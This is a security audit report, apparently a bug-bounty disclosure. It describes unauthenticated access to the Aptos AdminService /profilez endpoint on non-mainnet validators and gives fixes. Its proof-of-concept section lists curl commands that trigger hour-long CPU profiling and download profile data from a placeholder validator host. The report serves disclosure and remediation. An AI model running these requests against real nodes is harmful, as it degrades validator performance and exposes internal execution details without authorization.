# Audit Report

## Title
Unauthenticated Access to Profiler Functionality on Non-Mainnet Validator Nodes Enables Resource Exhaustion and Information Disclosure

## Summary
The profiler functionality exposed through the AdminService lacks proper access control on testnet and devnet deployments. The authentication mechanism defaults to an insecure configuration where empty `authentication_configs` automatically authenticates all requests, allowing any attacker with network access to trigger CPU profiling operations, causing validator performance degradation and leaking internal execution details.

## Finding Description

The profiler utilities in `utils.rs` lack independent access controls and rely entirely on the AdminService authentication layer. However, the AdminService has a critical authentication bypass on non-mainnet chains: [1](#0-0) 

The default configuration sets `authentication_configs` to an empty vector. The AdminService authentication logic treats empty authentication configs as "authenticated by default": [2](#0-1) 

The sanitizer only enforces authentication requirements on mainnet, explicitly allowing this insecure default on testnet/devnet: [3](#0-2) 

Furthermore, the optimizer auto-enables the AdminService on non-mainnet chains: [4](#0-3) 

The service binds to all network interfaces by default: [5](#0-4) 

This exposes the `/profilez` endpoint which triggers CPU profiling operations: [6](#0-5) 

The profiling endpoint accepts user-controlled duration parameters with no upper bounds: [7](#0-6) 

While a mutex prevents concurrent profiling, there is no rate limiting to prevent sequential attacks: [8](#0-7) 

The file operations in `utils.rs` execute without additional access controls: [9](#0-8) 

**Attack Path:**
1. Attacker identifies testnet/devnet validator at `validator-ip:9102`
2. Sends unauthenticated request: `GET http://validator-ip:9102/profilez?seconds=3600`
3. CPU profiling runs for 1 hour, degrading validator performance
4. Attacker can queue additional requests after mutex release
5. Profiling results expose internal validator execution patterns

This breaks the **Access Control** invariant (system operations must be restricted to authorized operators) and the **Resource Limits** invariant (all operations must respect computational limits).

## Impact Explanation

This qualifies as **High Severity** per the Aptos Bug Bounty program criteria:

- **Validator node slowdowns**: CPU profiling consumes significant resources, directly degrading consensus participation and block production performance
- **Information disclosure**: Profiling flamegraphs expose thread names, function call stacks, and execution patterns that reveal validator implementation details
- **No authentication barrier**: Exploitable by any attacker with network access to port 9102
- **Affects real infrastructure**: Testnet and devnet validators are production systems used for protocol testing and development

The impact is limited to non-mainnet chains, preventing Critical severity classification, but testnet/devnet disruption still constitutes significant protocol violation and operational harm.

## Likelihood Explanation

**Likelihood: High**

- **Low complexity**: Exploitation requires only a simple HTTP GET request
- **No special requirements**: No authentication, credentials, or insider access needed  
- **Default configuration**: Vulnerability exists in default deployment configurations for all non-mainnet validators
- **Public exposure**: AdminService binds to `0.0.0.0:9102` by all network interfaces
- **Discoverable**: Port scanning easily identifies exposed AdminService endpoints

The only mitigating factors are:
- Network firewalls may block port 9102 (not guaranteed)
- Limited to non-mainnet deployments
- Mutex prevents concurrent profiling (but not sequential abuse)

## Recommendation

Implement multi-layered access controls:

**1. Require authentication on all chains:**
```rust
// In config/src/config/admin_service_config.rs sanitize method
if node_config.admin_service.enabled == Some(true) 
    && node_config.admin_service.authentication_configs.is_empty() 
{
    return Err(Error::ConfigSanitizerFailed(
        sanitizer_name,
        "Must enable authentication for AdminService on all chains.".into(),
    ));
}
```

**2. Add rate limiting and duration caps:**
```rust
// In crates/aptos-system-utils/src/profiling.rs
const MAX_PROFILING_DURATION_SECS: u64 = 300; // 5 minutes max
const MIN_INTERVAL_BETWEEN_PROFILES_SECS: u64 = 60;

pub async fn handle_cpu_profiling_request(req: Request<Body>) -> hyper::Result<Response<Body>> {
    // ... existing query parsing ...
    
    if seconds > MAX_PROFILING_DURATION_SECS {
        return Ok(reply_with_status(
            StatusCode::BAD_REQUEST,
            format!("Duration exceeds maximum of {} seconds", MAX_PROFILING_DURATION_SECS)
        ));
    }
    
    // Add rate limiting with last_profile_time tracking
}
```

**3. Change default authentication behavior:**
```rust
// In crates/aptos-admin-service/src/server/mod.rs
let mut authenticated = false;
// Remove the automatic authentication for empty configs
for authentication_config in &context.config.authentication_configs {
    // ... existing authentication logic ...
}
```

**4. Bind to localhost by default for non-mainnet:**
```rust
// In config/src/config/admin_service_config.rs
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "127.0.0.1".to_string(), // Changed from "0.0.0.0"
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
}
```

## Proof of Concept

**Setup:** Deploy an Aptos testnet validator node with default configuration.

**Exploitation:**
```bash
# Step 1: Identify target validator
TARGET="testnet-validator.example.com:9102"

# Step 2: Trigger long-running CPU profiling (no authentication required)
curl -v "http://${TARGET}/profilez?seconds=3600&format=flamegraph"

# Step 3: Monitor validator performance degradation
# Validator will exhibit reduced block production and consensus participation

# Step 4: After mutex releases, queue another profiling session
curl -v "http://${TARGET}/profilez?seconds=3600&format=flamegraph"

# Step 5: Extract profiling data revealing internal implementation
curl -v "http://${TARGET}/profilez?seconds=10&format=proto" -o profile.pb
```

**Expected Result:** Unauthenticated access granted, profiling executes for requested duration, validator performance degrades, internal execution details exposed.

**Notes:**
- Default testnet/devnet configurations automatically enable AdminService
- Empty `authentication_configs` bypasses all authentication checks  
- No rate limiting allows continuous profiling abuse
- Profiling results contain sensitive operational information

### Citations

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L67-78)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
        }
```

**File:** config/src/config/admin_service_config.rs (L93-103)
```rust
        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-156)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L185-185)
```rust
            (hyper::Method::GET, "/profilez") => handle_cpu_profiling_request(req).await,
```

**File:** crates/aptos-system-utils/src/profiling.rs (L23-29)
```rust
    let seconds: u64 = match query_pairs.get("seconds") {
        Some(val) => match val.parse() {
            Ok(val) => val,
            Err(err) => return Ok(reply_with_status(StatusCode::BAD_REQUEST, err.to_string())),
        },
        None => 10,
    };
```

**File:** crates/aptos-system-utils/src/profiling.rs (L91-92)
```rust
    let lock = CPU_PROFILE_MUTEX.try_lock();
    ensure!(lock.is_some(), "A profiling task is already running.");
```

**File:** crates/aptos-profiler/src/utils.rs (L11-16)
```rust
pub fn create_file_with_parents<P: AsRef<Path>>(path: P) -> Result<File, std::io::Error> {
    let path = path.as_ref();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    File::create(path)
```
